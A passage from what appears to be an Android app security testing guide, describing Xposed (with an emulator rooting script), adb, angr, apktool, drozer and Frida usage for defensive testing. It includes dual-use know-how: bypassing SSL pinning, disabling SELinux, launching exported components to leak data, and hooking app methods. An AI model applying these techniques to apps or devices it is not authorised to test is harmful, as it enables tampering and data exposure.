and apps without touching any APKs.''. Technically, it is an extended
version of Zygote that exports APIs for running Java code when a new
process is started. Running Java code in the context of the newly
instantiated app makes it possible to resolve, hook, and override Java
methods belonging to the app. Xposed uses
\href{https://docs.oracle.com/javase/tutorial/reflect/}{reflection} to
examine and modify the running app. Changes are applied in memory and
persist only during the process' runtime since the application binaries
are not modified.

To use Xposed, you need to first install the Xposed framework on a
rooted device as explained on
\href{https://www.xda-developers.com/xposed-framework-hub/}{XDA-Developers
Xposed framework hub}. Modules can be installed through the Xposed
Installer app, and they can be toggled on and off through the GUI.

Note: given that a plain installation of the Xposed framework is easily
detected with SafetyNet, we recommend using Magisk to install Xposed.
This way, applications with SafetyNet attestation should have a higher
chance of being testable with Xposed modules.

Xposed has been compared to Frida. When you run Frida server on a rooted
device, you will end up with a similarly effective setup. Both
frameworks deliver a lot of value when you want to do dynamic
instrumentation. When Frida crashes the app, you can try something
similar with Xposed. Next, similar to the abundance of Frida scripts,
you can easily use one of the many modules that come with Xposed, such
as the earlier discussed module to bypass SSL pinning
(\href{https://github.com/Fuzion24/JustTrustMe}{JustTrustMe} and
\href{https://github.com/ac-pm/SSLUnpinning_Xposed}{SSLUnpinning}).
Xposed includes other modules, such as
\href{https://github.com/ac-pm/Inspeckage}{Inspeckage} which allow you
to do more in depth application testing as well. On top of that, you can
create your own modules as well to patch often used security mechanisms
of Android applications.

Xposed can also be installed on an emulator through the following
script:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\#!/bin/sh}
\BuiltInTok{echo} \StringTok{"Start your emulator with \textquotesingle{}emulator {-}avd NAMEOFX86A8.0 {-}writable{-}system {-}selinux permissive {-}wipe{-}data\textquotesingle{}"}
\ExtensionTok{adb}\NormalTok{ root }\KeywordTok{\&\&} \ExtensionTok{adb}\NormalTok{ remount}
\ExtensionTok{adb}\NormalTok{ install SuperSU}\DataTypeTok{\textbackslash{} }\NormalTok{v2.79.apk }\CommentTok{\#binary can be downloaded from http://www.supersu.com/download}
\ExtensionTok{adb}\NormalTok{ push root\_avd{-}master/SuperSU/x86/su /system/xbin/su}
\ExtensionTok{adb}\NormalTok{ shell chmod 0755 /system/xbin/su}
\ExtensionTok{adb}\NormalTok{ shell setenforce 0}
\ExtensionTok{adb}\NormalTok{ shell su {-}{-}install}
\ExtensionTok{adb}\NormalTok{ shell su {-}{-}daemon}\KeywordTok{\&}
\ExtensionTok{adb}\NormalTok{ push busybox /data/busybox }\CommentTok{\#binary can be downloaded from https://busybox.net/}
\CommentTok{\# adb shell "mount {-}o remount,rw /system \&\& mv /data/busybox /system/bin/busybox \&\& chmod 755 /system/bin/busybox \&\& /system/bin/busybox {-}{-}install /system/bin"}
\ExtensionTok{adb}\NormalTok{ shell chmod 755 /data/busybox}
\ExtensionTok{adb}\NormalTok{ shell }\StringTok{\textquotesingle{}sh {-}c "./data/busybox {-}{-}install /data"\textquotesingle{}}
\ExtensionTok{adb}\NormalTok{ shell }\StringTok{\textquotesingle{}sh {-}c "mkdir /data/xposed"\textquotesingle{}}
\ExtensionTok{adb}\NormalTok{ push xposed8.zip /data/xposed/xposed.zip }\CommentTok{\#can be downloaded from https://dl{-}xda.xposed.info/framework/}
\ExtensionTok{adb}\NormalTok{ shell chmod 0755 /data/xposed}
\ExtensionTok{adb}\NormalTok{ shell }\StringTok{\textquotesingle{}sh {-}c "./data/unzip /data/xposed/xposed.zip {-}d /data/xposed/"\textquotesingle{}}
\ExtensionTok{adb}\NormalTok{ shell }\StringTok{\textquotesingle{}sh {-}c "cp /data/xposed/xposed/META{-}INF/com/google/android/*.* /data/xposed/xposed/"\textquotesingle{}}
\BuiltInTok{echo} \StringTok{"Now adb shell and do \textquotesingle{}su\textquotesingle{}, next: go to ./data/xposed/xposed, make flash{-}script.sh executable and run it in that directory after running SUperSU"}
\BuiltInTok{echo} \StringTok{"Next, restart emulator"}
\BuiltInTok{echo} \StringTok{"Next, adb install XposedInstaller\_3.1.5.apk"}
\BuiltInTok{echo} \StringTok{"Next, run installer and then adb reboot"}
\BuiltInTok{echo} \StringTok{"Want to use it again? Start your emulator with \textquotesingle{}emulator {-}avd NAMEOFX86A8.0 {-}writable{-}system {-}selinux permissive\textquotesingle{}"}
\end{Highlighting}
\end{Shaded}

Please note that Xposed, at the time of this writing, does not work on
Android 9 (API level 28). However, it was unofficially ported in 2019
under the name EdXposed, supporting Android 8-10 (API level 26 till 29).
You can find the code and usage examples at
\href{https://github.com/ElderDrivers/EdXposed}{EdXposed} Github repo.

\hypertarget{recommended-tools---host-computer}{%
\paragraph{Recommended Tools - Host
computer}\label{recommended-tools---host-computer}}

In order to analyze Android apps, you should install the following tools
on your host computer. Please check the official documentation for
installation instructions of the following tools/frameworks. We'll be
referring to them throughout the guide.

\hypertarget{adb}{%
\subparagraph{Adb}\label{adb}}

\href{https://developer.android.com/studio/command-line/adb}{adb}
(Android Debug Bridge), shipped with the Android SDK, bridges the gap
between your local development environment and a connected Android
device. You'll usually leverage it to test apps on the emulator or a
connected device via USB or Wi-Fi. Use the \texttt{adb\ devices} command
to list the connected devices and execute it with the \texttt{-l}
argument to retrieve more details on them.

\begin{verbatim}
$ adb devices -l
List of devices attached
090c285c0b97f748 device usb:1-1 product:razor model:Nexus_7 device:flo
emulator-5554    device product:sdk_google_phone_x86 model:Android_SDK_built_for_x86 device:generic_x86 transport_id:1
\end{verbatim}

adb provides other useful commands such as \texttt{adb\ shell} to start
an interactive shell on a target and \texttt{adb\ forward} to forward
traffic on a specific host port to a different port on a connect device.

\begin{verbatim}
$ adb forward tcp:<host port> tcp:<device port>
\end{verbatim}

\begin{verbatim}
$ adb -s emulator-5554 shell
root@generic_x86:/ # ls
acct
cache
charger
config
...
\end{verbatim}

You'll come across different use cases on how you can use adb commands
when testing later in this book. Note that you must define the
serialnummer of the target device with the \texttt{-s} argument (as
shown by the previous code snippet) in case you have multiple devices
connected.

\hypertarget{angr}{%
\subparagraph{Angr}\label{angr}}

Angr is a Python framework for analyzing binaries. It is useful for both
static and dynamic symbolic (``concolic'') analysis. In other words:
given a binary and a requested state, Angr will try to get to that
state, using formal methods (a technique used for static code analysis)
to find a path, as well as brute forcing. Using angr to get to the
requested state is often much faster than taking manual steps for
debugging and searching the path towards the required state. Angr
operates on the VEX intermediate language and comes with a loader for
ELF/ARM binaries, so it is perfect for dealing with native code, such as
native Android binaries.

Angr allows for disassembly, program instrumentation, symbolic
execution, control-flow analysis, data-dependency analysis,
decompilation and more, given a large set of plugins.

Since version 8, Angr is based on Python 3, and can be installed with
pip on *nix operating systems, macOS and Windows:

\begin{verbatim}
$ pip install angr
\end{verbatim}

\begin{quote}
Some of angr's dependencies contain forked versions of the Python
modules Z3 and PyVEX, which would overwrite the original versions. If
you're using those modules for anything else, you should create a
dedicated virtual environment with
\href{https://docs.python.org/3/tutorial/venv.html}{Virtualenv}.
Alternatively, you can always use the provided docker container. See the
\href{https://docs.angr.io/introductory-errata/install}{installation
guide} for more details.
\end{quote}

Comprehensive documentation, including an installation guide, tutorials,
and usage examples are available on \href{https://docs.angr.io/}{Angr's
Gitbooks page}. A complete \href{https://angr.io/api-doc/}{API
reference} is also available.

You can use angr from a Python REPL - such as iPython - or script your
approaches. Although angr has a bit of a steep learning curve, we do
recommend using it when you want to brute force your way to a given
state of an executable. Please see the
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#symbolic-execution}{Symbolic
Execution}'' section of the ``Reverse Engineering and Tampering''
chapter as a great example on how this can work.

\hypertarget{apktool}{%
\subparagraph{Apktool}\label{apktool}}

\href{https://github.com/iBotPeaches/Apktool}{Apktool} is used to unpack
Android app packages (APKs). Simply unzipping APKs with the standard
\texttt{unzip} utility leaves some files unreadable.
\texttt{AndroidManifest.xml} is encoded into binary XML format which
isn't readable with a text editor. Also, the app resources are still
packaged into a single archive file.

When run with default command line flags, apktool automatically decodes
the Android Manifest file to text-based XML format and extracts the file
resources (it also disassembles the .DEX files to smali code -- a
feature that we'll revisit later in this book).

\begin{verbatim}
$ apktool d base.apk
I: Using Apktool 2.1.0 on base.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /Users/sven/Library/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
$ cd base
$ ls -alh
total 32
drwxr-xr-x    9 sven  staff   306B Dec  5 16:29 .
drwxr-xr-x    5 sven  staff   170B Dec  5 16:29 ..
-rw-r--r--    1 sven  staff    10K Dec  5 16:29 AndroidManifest.xml
-rw-r--r--    1 sven  staff   401B Dec  5 16:29 apktool.yml
drwxr-xr-x    6 sven  staff   204B Dec  5 16:29 assets
drwxr-xr-x    3 sven  staff   102B Dec  5 16:29 lib
drwxr-xr-x    4 sven  staff   136B Dec  5 16:29 original
drwxr-xr-x  131 sven  staff   4.3K Dec  5 16:29 res
drwxr-xr-x    9 sven  staff   306B Dec  5 16:29 smali
\end{verbatim}

The unpacked files are:

\begin{itemize}
\tightlist
\item
  AndroidManifest.xml: The decoded Android Manifest file, which can be
  opened and edited in a text editor.
\item
  apktool.yml: file containing information about the output of apktool
\item
  original: folder containing the MANIFEST.MF file, which contains
  information about the files contained in the JAR file
\item
  res: directory containing the app's resources
\item
  smali: directory containing the disassembled Dalvik bytecode.
\end{itemize}

You can also use apktool to repackage decoded resources back to binary
APK/JAR. See the section
``\protect\hyperlink{exploring-the-app-package}{Exploring the App
Package}'' later on this chapter and section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#repackaging}{Repackaging}''
in the chapter
\href{0x05c-Reverse-Engineering-and-Tampering.md}{Tampering and Reverse
Engineering on Android} for more information and practical examples.

\hypertarget{apkx}{%
\subparagraph{Apkx}\label{apkx}}

\texttt{Apkx} is a Python wrapper to popular free DEX converters and
Java decompilers. It automates the extraction, conversion, and
decompilation of APKs. Install it as follows:

\begin{verbatim}
$ git clone https://github.com/b-mueller/apkx
$ cd apkx
$ sudo ./install.sh
\end{verbatim}

This should copy \texttt{apkx} to \texttt{/usr/local/bin}. See section
``\href{0x05c-Reverse-Engineering-and-Tampering.md\#decompiling-java-code}{Decompiling
Java Code}'' of the ``Reverse Engineering and Tampering'' chapter for
more information about usage.

\hypertarget{burp-suite}{%
\subparagraph{Burp Suite}\label{burp-suite}}

Burp Suite is an integrated platform for security testing mobile and web
applications. Its tools work together seamlessly to support the entire
testing process, from initial mapping and analysis of attack surfaces to
finding and exploiting security vulnerabilities. Burp Proxy operates as
a web proxy server for Burp Suite, which is positioned as a
man-in-the-middle between the browser and web server(s). Burp Suite
allows you to intercept, inspect, and modify incoming and outgoing raw
HTTP traffic.

Setting up Burp to proxy your traffic is pretty straightforward. We
assume that you have an iOS device and workstation connected to a Wi-Fi
network that permits client-to-client traffic.

PortSwigger provides a good
\href{https://support.portswigger.net/customer/portal/articles/1841101-configuring-an-android-device-to-work-with-burp}{tutorial
on setting up an Android device to work with Burp} and a
\href{https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device}{tutorial
on installing Burp's CA certificate to an Android device}.

\hypertarget{drozer}{%
\subparagraph{Drozer}\label{drozer}}

\href{https://github.com/FSecureLABS/drozer}{Drozer} is an Android
security assessment framework that allows you to search for security
vulnerabilities in apps and devices by assuming the role of a
third-party app interacting with the other application's IPC endpoints
and the underlying OS.

The advantage of using drozer consists on its ability to automate
several tasks and that it can be expanded through modules. The modules
are very helpful and they cover different categories including a scanner
category that allows you to scan for known defects with a simple command
such as the module \texttt{scanner.provider.injection} which detects SQL
injections in content providers in all the apps installed in the system.
Without drozer, simple tasks such as listing the app's permissions
require several steps that include decompiling the APK and manually
analyzing the results.

Installing Drozer

You can refer to \href{https://github.com/FSecureLABS/drozer}{drozer
GitHub page} (for Linux and Windows, for macOS please refer to this
\href{https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/}{blog
post}) and the \href{https://labs.f-secure.com/tools/drozer/}{drozer
website} for prerequisites and installation instructions.

The installation instructions for drozer on Unix, Linux and Windows are
explained in the \href{https://github.com/FSecureLABS/drozer}{drozer
Github page}. For macOS,
\href{https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/}{this
blog post} demonstrates all installation instructions.

Using Drozer

Before you can start using drozer, you'll also need the drozer agent
that runs on the Android device itself. Download the latest drozer agent
\href{https://github.com/FSecureLABS/drozer/releases/}{from the GitHub
releases page} and install it with \texttt{adb\ install\ drozer.apk}.

Once the setup is completed you can start a session to an emulator or a
device connected per USB by running
\texttt{adb\ forward\ tcp:31415\ tcp:31415} and
\texttt{drozer\ console\ connect}. This is called direct mode and you
can see the full instructions in the
\href{https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf}{User
Guide in section ``Starting a Session''}. An alternative is to run
Drozer in infrastructure mode, where, you are running a drozer server
that can handle multiple consoles and agents, and routes sessions
between them. You can find the details of how to setup drozer in this
mode in the
\href{https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf}{``Infrastructure
Mode''} section of the User Guide.

Now you are ready to begin analyzing apps. A good first step is to
enumerate the attack surface of an app which can be done easily with the
following command:

\begin{verbatim}
$ dz> run app.package.attacksurface <package>
\end{verbatim}

Again, without drozer this would have required several steps. The module
\texttt{app.package.attacksurface} lists activities, broadcast
receivers, content providers and services that are exported, hence, they
are public and can be accessed through other apps. Once we have
identified our attack surface, we can interact with the IPC endpoints
through drozer without having to write a separate standalone app as it
would be required for certain tasks such as communicating with a content
provider.

For example, if the app has an exported Activity that leaks sensitive
information we can invoke it with the Drozer module
\texttt{app.activity.start}:

\begin{verbatim}
$ dz> run app.activity.start --component <package> <component name>
\end{verbatim}

This previous command will start the activity, hopefully leaking some
sensitive information. Drozer has modules for every type of IPC
mechanism. Download
\href{https://github.com/dineshshetty/Android-InsecureBankv2}{InsecureBankv2}
if you would like to try the modules with an intentionally vulnerable
application that illustrates common problems related to IPC endpoints.
Pay close attention to the modules in the scanner category as they are
very helpful automatically detecting vulnerabilities even in system
packages, specially if you are using a ROM provided by your cellphone
company. Even
\href{https://issuetracker.google.com/u/0/issues/36965126}{SQL injection
vulnerabilities in system packages by Google} have been identified in
the past with drozer.

Other Drozer commands

Here's a non-exhaustive list of commands you can use to start exploring
on Android:

\begin{verbatim}
# List all the installed packages
$ dz> run app.package.list

# Find the package name of a specific app
$ dz> run app.package.list –f (string to be searched)

# See basic information
$ dz> run app.package.info –a (package name)

# Identify the exported application components
$ dz> run app.package.attacksurface (package name)

# Identify the list of exported Activities
$ dz> run app.activity.info -a (package name)

# Launch the exported Activities
$ dz> run app.activity.start --component (package name) (component name)

# Identify the list of exported Broadcast receivers
$ dz> run app.broadcast.info -a (package name)

# Send a message to a Broadcast receiver
$ dz> run app.broadcast.send --action (broadcast receiver name) -- extra (number of arguments)

# Detect SQL injections in content providers
$ dz> run scanner.provider.injection -a (package name)
\end{verbatim}

Other Drozer resources

Other resources where you might find useful information are:

\begin{itemize}
\tightlist
\item
  \href{https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf}{Official
  drozer User Guide}.
\item
  \href{https://github.com/FSecureLABS/drozer}{drozer GitHub page}
\item
  \href{https://github.com/FSecureLABS/drozer/wiki}{drozer Wiki}
\end{itemize}

\hypertarget{frida-1}{%
\subparagraph{Frida}\label{frida-1}}

\href{https://www.frida.re}{Frida} is a free and open-source dynamic
code instrumentation toolkit that lets you execute snippets of
JavaScript into your native apps. It was already introduced in the
chapter
``\href{0x04c-Tampering-and-Reverse-Engineering.md\#frida}{Tampering and
Reverse Engineering}'' of the general testing guide.

Frida supports interaction with the Android Java runtime though the
\href{https://www.frida.re/docs/javascript-api/\#java}{Java API}. You'll
be able to hook and call both Java and native functions inside the
process and its native libraries. Your JavaScript snippets have full
access to memory, e.g.~to read and/or write any structured data.

Here are some tasks that Frida APIs offers and are relevant or exclusive
on Android:

\begin{itemize}
\tightlist
\item
  Instantiate Java objects and call static and non-static class methods
  (\href{https://www.frida.re/docs/javascript-api/\#java}{Java API}).
\item
  Replace Java method implementations
  (\href{https://www.frida.re/docs/javascript-api/\#java}{Java API}).
\item
  Enumerate live instances of specific classes by scanning the Java heap
  (\href{https://www.frida.re/docs/javascript-api/\#java}{Java API}).
\item
  Scan process memory for occurrences of a string
  (\href{https://www.frida.re/docs/javascript-api/\#memory}{Memory
  API}).
\item
  Intercept native function calls to run your own code at function entry
  and exit
  (\href{https://www.frida.re/docs/javascript-api/\#interceptor}{Interceptor
  API}).
\end{itemize}

Remember that on Android, you can also benefit from the built-in tools
provided when installing Frida, that includes the Frida CLI
(\texttt{frida}), \texttt{frida-ps}, \texttt{frida-ls-devices} and
\texttt{frida-trace}, to name some of them.

Frida is often compared to Xposed, however this comparison is far from
fair as both frameworks were designed with different goals in mind. This
is important to understand as an app security tester so that you can
know which framework to use in which situation:

\begin{itemize}
\tightlist
\item
  Frida is standalone, all you need is to run the frida-server binary
  from a known location in your target Android device (see ``Installing
  Frida'' below). This means that, in contrast to Xposed, it is not
  \emph{deep} installed in the target OS.
\item
  Reversing an app is an iterative process. As a consequence of the
  previous point, you obtain a shorter feedback loop when testing as you
  don't need to (soft) reboot to apply or simply update your hooks. So
  you might prefer to use Xposed when implementing more permanent hooks.
\item
  You may inject and update your Frida JavaScript code on the fly at any
  point during the runtime of your process (similarly to Cycript on
  iOS). This way you can perform the so-called \emph{early
  instrumentation} by letting Frida spawn your app or you may prefer to
  attach to a running app that you might have brought to a certain
  state.
\item
  Frida is able to handle both Java as well as native code (JNI),
  allowing you to modify both of them. This is unfortunately a
  limitation of Xposed which lacks of native code support.
\end{itemize}

\begin{quote}
Note that Xposed, as of early 2019, does not work on Android 9 (API
level 28) yet.
\end{quote}

Installing Frida

To install Frida locally, simply run:

\begin{verbatim}
$ pip install frida-tools
\end{verbatim}

Or refer to the
\href{https://www.frida.re/docs/installation/}{installation page} for
more details.

The next step is to set up Frida on your Android device:

\begin{itemize}
\tightlist
\item
  If your device is not rooted, you can also use Frida, please refer to
  section
  ``\href{0x05c-Reverse-Engineering-and-Tampering.md\#dynamic-analysis-on-non-rooted-devices}{Dynamic
  Analysis on Non-Rooted Devices}'' of the ``Reverse Engineering and
  Tampering'' chapter.
\item
  If you have a rooted device, simply follow the
  \href{https://www.frida.re/docs/android/}{official instructions} or
  follow the hints below.
\end{itemize}

We assume a rooted device here unless otherwise noted. Download the
frida-server binary from the
\href{https://github.com/frida/frida/releases}{Frida releases page}.
Make sure that you download the right frida-server binary for the
architecture of your Android device or emulator: x86, x86\_64, arm or
arm64. Make sure that the server version (at least the major version
number) matches the version of your local Frida installation. PyPI
usually installs the latest version of Frida. If you're unsure which
version is installed, you can check with the Frida command line tool:

\begin{verbatim}
$ frida --version
\end{verbatim}

Or you can run the following command to automatically detect Frida
version and download the right frida-server binary:

\begin{verbatim}
$ wget https://github.com/frida/frida/releases/download/$(frida --version)/frida-server-$(frida --version)-android-arm.xz
\end{verbatim}

Copy frida-server to the device and run it:

\begin{verbatim}
$ adb push frida-server /data/local/tmp/
$ adb shell "chmod 755 /data/local/tmp/frida-server"
$ adb shell "su -c /data/local/tmp/frida-server &"
\end{verbatim}

Using Frida on Android

With frida-server running, you should now be able to get a list of
running processes with the following command (use the \texttt{-U} option
to indicate Frida to use a connected USB devices or emulator):

\begin{verbatim}
$ frida-ps -U
  PID  Name
-----  --------------------------------------------------------------
  276  adbd
  956  android.process.media
  198  bridgemgrd
30692  com.android.chrome
30774  com.android.chrome:privileged_process0
30747  com.android.chrome:sandboxed
30834  com.android.chrome:sandboxed
 3059  com.android.nfc
 1526  com.android.phone
17104  com.android.settings
 1302  com.android.systemui
(...)
\end{verbatim}

Or restrict the list with the \texttt{-Uai} flag combination to get all
apps (\texttt{-a}) currently installed (\texttt{-i}) on the connected
USB device (\texttt{-U}):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}ps}\NormalTok{ {-}Uai}
  \ExtensionTok{PID}\NormalTok{  Name                                      Identifier}
\ExtensionTok{{-}{-}{-}{-}{-}}\NormalTok{  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}  {-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
  \ExtensionTok{766}\NormalTok{  Android System                            android}
\ExtensionTok{30692}\NormalTok{  Chrome                                    com.android.chrome}
 \ExtensionTok{3520}\NormalTok{  Contacts Storage                          com.android.providers.contacts}
    \ExtensionTok{{-}}\NormalTok{  Uncrackable1                              sg.vantagepoint.uncrackable1}
    \ExtensionTok{{-}}\NormalTok{  drozer Agent                              com.mwr.dz}
\end{Highlighting}
\end{Shaded}

This will show the names and identifiers of all apps, if they are
currently running it will also show their PIDs. Search for your app in
the list and take a note of the PID or its name/identifier. From now on
you'll refer to your app by using one of them. A recommendation is to
use the identifiers, as the PIDs will change on each run of the app. For
example let's take \texttt{com.android.chrome}. You can use this string
now on all Frida tools, e.g.~on the Frida CLI, on frida-trace or from a
Python script.

Tracing Native Libraries with frida-trace

To trace specific (low-level) library calls, you can use the
\texttt{frida-trace} command line tool:

\begin{verbatim}
$ frida-trace -U com.android.chrome -i "open"
\end{verbatim}

This generates a little JavaScript in
\texttt{\_\_handlers\_\_/libc.so/open.js}, which Frida injects into the
process. The script traces all calls to the \texttt{open} function in
\texttt{libc.so}. You can modify the generated script according to your
needs with Frida
\href{https://www.frida.re/docs/javascript-api/}{JavaScript API}.

Unfortunately tracing high-level methods of Java classes is not yet
supported (but might be
\href{https://github.com/frida/frida-python/issues/70}{in the future}).

Frida CLI and the Java API

Use the Frida CLI tool (\texttt{frida}) to work with Frida
interactively. It hooks into a process and gives you a command line
interface to Frida's API.

\begin{verbatim}
$ frida -U com.android.chrome
\end{verbatim}

With the \texttt{-l} option, you can also use the Frida CLI to load
scripts , e.g., to load \texttt{myscript.js}:

\begin{verbatim}
$ frida -U -l myscript.js com.android.chrome
\end{verbatim}

Frida also provides a
\href{https://www.frida.re/docs/javascript-api/\#java}{Java API}, which
is especially helpful for dealing with Android apps. It lets you work
with Java classes and objects directly. Here is a script to overwrite
the \texttt{onResume} function of an Activity class:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Java.}\FunctionTok{perform}\NormalTok{(}\FunctionTok{function}\NormalTok{ () \{}
\NormalTok{    var Activity = Java.}\FunctionTok{use}\NormalTok{(}\StringTok{"android.app.Activity"}\NormalTok{);}
\NormalTok{    Activity.}\FunctionTok{onResume}\NormalTok{.}\FunctionTok{implementation}\NormalTok{ = }\FunctionTok{function}\NormalTok{ () \{}
\NormalTok{        console.}\FunctionTok{log}\NormalTok{(}\StringTok{"[*] onResume() got called!"}\NormalTok{);}
        \KeywordTok{this}\NormalTok{.}\FunctionTok{onResume}\NormalTok{();}
\NormalTok{    \};}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

The above script calls \texttt{Java.perform} to make sure that your code
gets executed in the context of the Java VM. It instantiates a wrapper
for the \texttt{android.app.Activity} class via \texttt{Java.use} and
overwrites the \texttt{onResume} function. The new \texttt{onResume}
function implementation prints a notice to the console and calls the
original \texttt{onResume} method by invoking \texttt{this.onResume}
every time an activity is resumed in the app.

Frida also lets you search for and work with instantiated objects that
are on the heap. The following script searches for instances of
\texttt{android.view.View} objects and calls their \texttt{toString}
method. The result is printed to the console:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{setImmediate}\NormalTok{(}\FunctionTok{function}\NormalTok{() \{}
\NormalTok{    console.}\FunctionTok{log}\NormalTok{(}\StringTok{"[*] Starting script"}\NormalTok{);}
\NormalTok{    Java.}\FunctionTok{perform}\NormalTok{(}\FunctionTok{function}\NormalTok{ () \{}
\NormalTok{        Java.}\FunctionTok{choose}\NormalTok{(}\StringTok{"android.view.View"}\NormalTok{, \{}
             \StringTok{"onMatch"}\NormalTok{:}\FunctionTok{function}\NormalTok{(instance)\{}
\NormalTok{                  console.}\FunctionTok{log}\NormalTok{(}\StringTok{"[*] Instance found: "}\NormalTok{ + instance.}\FunctionTok{toString}\NormalTok{());}
\NormalTok{             \},}
             \StringTok{"onComplete"}\NormalTok{:}\FunctionTok{function}\NormalTok{() \{}
\NormalTok{                  console.}\FunctionTok{log}\NormalTok{(}\StringTok{"[*] Finished heap search"}\NormalTok{)}
\NormalTok{             \}}
\NormalTok{        \});}
\NormalTok{    \});}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

The output would look like this:

\begin{verbatim}
[*] Starting script
[*] Instance found: android.view.View{7ccea78 G.ED..... ......ID 0,0-0,0 #7f0c01fc app:id/action_bar_black_background}
[*] Instance found: android.view.View{2809551 V.ED..... ........ 0,1731-0,1731 #7f0c01ff app:id/menu_anchor_stub}
[*] Instance found: android.view.View{be471b6 G.ED..... ......I. 0,0-0,0 #7f0c01f5 app:id/location_bar_verbose_status_separator}
[*] Instance found: android.view.View{3ae0eb7 V.ED..... ........ 0,0-1080,63 #102002f android:id/statusBarBackground}
[*] Finished heap search
\end{verbatim}

You can also use Java's reflection capabilities. To list the public
methods of the \texttt{android.view.View} class, you could create a
wrapper for this class in Frida and call \texttt{getMethods} from the
wrapper's \texttt{class} property:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{Java.}\FunctionTok{perform}\NormalTok{(}\FunctionTok{function}\NormalTok{ () \{}
\NormalTok{    var view = Java.}\FunctionTok{use}\NormalTok{(}\StringTok{"android.view.View"}\NormalTok{);}
\NormalTok{    var methods = view.}\FunctionTok{class}\NormalTok{.}\FunctionTok{getMethods}\NormalTok{();}
    \KeywordTok{for}\NormalTok{(var i = }\DecValTok{0}\NormalTok{; i < methods.}\FunctionTok{length}\NormalTok{; i++) \{}
\NormalTok{        console.}\FunctionTok{log}\NormalTok{(methods[i].}\FunctionTok{toString}\NormalTok{());}
\NormalTok{    \}}
\NormalTok{\});}
\end{Highlighting}
\end{Shaded}

This will print a very long list of methods to the terminal:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canResolveLayoutDirection}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canResolveTextAlignment}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canResolveTextDirection}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canScrollHorizontally}\NormalTok{(}\DataTypeTok{int}\NormalTok{)}
\KeywordTok{public} \DataTypeTok{boolean}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{canScrollVertically}\NormalTok{(}\DataTypeTok{int}\NormalTok{)}
\KeywordTok{public} \DataTypeTok{final} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{cancelDragAndDrop}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{cancelLongPress}\NormalTok{()}
\KeywordTok{public} \DataTypeTok{final} \DataTypeTok{void}\NormalTok{ android.}\FunctionTok{view}\NormalTok{.}\FunctionTok{View}\NormalTok{.}\FunctionTok{cancelPendingInputEvents}\NormalTok{()}
\NormalTok{...}
\end{Highlighting}
\end{Shaded}

Frida Bindings

In order to extend the scripting experience, Frida offers bindings to
programming languages such as Python, C, NodeJS, and Swift.

Taking Python as an example, the first thing to note is that no further
installation steps are required. Start your Python script with
\texttt{import\ frida} and you're ready to go. See the following script
that simply runs the previous JavaScript snippet:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# frida\_python.py}
\ImportTok{import}\NormalTok{ frida}

\NormalTok{session }\OperatorTok{=}\NormalTok{ frida.get\_usb\_device().attach(}\StringTok{\textquotesingle{}com.android.chrome\textquotesingle{}}\NormalTok{)}

\NormalTok{source }\OperatorTok{=} \StringTok{"""}
\StringTok{Java.perform(function () \{}
\StringTok{    var view = Java.use("android.view.View");}
\StringTok{    var methods = view.class.getMethods();}
\StringTok{    for(var i = 0; i < methods.length; i++) \{}
\StringTok{        console.log(methods[i].toString());}
\StringTok{    \}}
\StringTok{\});}
\StringTok{"""}

\NormalTok{script }\OperatorTok{=}\NormalTok{ session.create\_script(source)}
\NormalTok{script.load()}

\NormalTok{session.detach()}
\end{Highlighting}
\end{Shaded}

In this case, running the Python script
(\texttt{python3\ frida\_python.py}) has the same result as the previous
example: it will print all methods of the \texttt{android.view.View}
class to the terminal. However, you might want to work with that data
from Python. Using \texttt{send} instead of \texttt{console.log} will
send data in JSON format from JavaScript to Python. Please read the
comments in the example below:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# python3 frida\_python\_send.py}
\ImportTok{import}\NormalTok{ frida}

